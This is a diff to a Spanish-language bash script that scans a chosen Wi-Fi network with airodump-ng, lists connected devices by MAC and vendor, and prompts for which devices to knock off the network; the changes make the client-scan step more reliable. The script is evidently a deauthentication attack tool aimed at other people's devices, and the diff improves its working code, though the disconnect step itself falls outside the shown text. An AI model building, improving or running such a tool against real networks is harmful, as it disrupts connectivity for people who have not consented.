@@ -45,9 +45,17 @@ echo -e "${GREEN}✅ Red seleccionada: $BSSID en el canal $CHANNEL${RESET}"
 
 # Escanear clientes conectados automáticamente
 echo -e "${CYAN}🔎 Escaneando dispositivos conectados a la red...${RESET}"
+touch clientes_scan-01.csv  # Asegurar que el archivo existe
 airodump-ng --bssid "$BSSID" -c "$CHANNEL" --output-format csv --write clientes_scan "$INTERFACE" > /dev/null 2>&1 &
-sleep 10
+sleep 15  # 🔥 DA MÁS TIEMPO AL ESCANEO
 pkill airodump-ng
+
+# Verificar si el archivo se creó correctamente
+CLIENTES_FILE=$(ls clientes_scan* | head -n 1)
+if [ ! -f "$CLIENTES_FILE" ]; then
+    echo -e "${RED}❌ ERROR: No se encontró el archivo de clientes. ¿Interfaz en modo monitor?${RESET}"
+    exit 1
+fi
 
 # Mostrar dispositivos conectados con nombre de fabricante
 echo -e "${YELLOW}📋 Dispositivos conectados detectados:${RESET}"
@@ -56,7 +64,7 @@ echo -e "N°  |  MAC Address       |  Fabricante"
 echo -e "${BLUE}----------------------------------------${RESET}"
 
 COUNT=1
-awk -F, 'NR>2 && $1 ~ /:/ {print $1}' clientes_scan-01.csv | while read -r MAC; do
+awk -F, 'NR>2 && $1 ~ /:/ {print $1}' "$CLIENTES_FILE" | while read -r MAC; do
     VENDOR=$(macchanger -l | grep -i "$(echo $MAC | cut -c 1-8)" | awk -F '  ' '{print $2}' | head -n 1)
     if [ -z "$VENDOR" ]; then
         VENDOR="Desconocido"
@@ -72,7 +80,7 @@ read -p "💀 Elige el número de los dispositivos a desconectar (separados por 
 # Convertir números en MACs
 CLIENTES_MAC=()
 for NUM in $CLIENTES_NUM; do
-    CLIENTES_MAC+=($(awk -F, -v num=$((NUM+2)) 'NR==num {print $1}' clientes_scan-01.csv))
+    CLIENTES_MAC+=($(awk -F, -v num=$((NUM+2)) 'NR==num {print $1}' "$CLIENTES_FILE"))
 done
 
 # Desconectar los clientes seleccionados
